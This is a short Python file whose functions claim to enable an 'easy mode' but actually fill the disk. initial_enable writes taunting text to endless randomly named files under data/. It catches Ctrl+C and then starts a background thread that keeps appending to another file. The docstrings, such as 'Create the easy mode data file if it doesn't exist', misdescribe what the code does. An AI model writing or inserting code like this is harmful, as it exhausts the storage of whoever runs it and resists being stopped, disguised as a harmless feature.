import os
import asyncio
import threading
import random

async def enable_easy_mode():
    while True:
        await asyncio.to_thread(_write_to_file, "data/easyModeData", "btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
        # unless you're reading this, then you get a cookie

def _write_to_file(filepath, content):
    with open(filepath, "a") as ef:
        ef.write(content)

def start_easy_mode_background():
    """Start easy mode in a background thread so it doesn't block the main program."""
    def run_async():
        asyncio.run(enable_easy_mode())
    
    thread = threading.Thread(target=run_async, daemon=True)
    thread.start()
    return thread

def generate_filename(length=20):
    """Generate a random filename."""
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(letters) for i in range(length))


def initial_enable():
    """Create the easy mode data file if it doesn't exist."""
    while True:
        try:
            while True:
                with open(f"data/{generate_filename()}", "a") as ef:
                    random.random
                    ef.write("btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
        except KeyboardInterrupt as e:
            print(f"python.KeyboardInterrupt failed to run. Continuing...")
            start_easy_mode_background()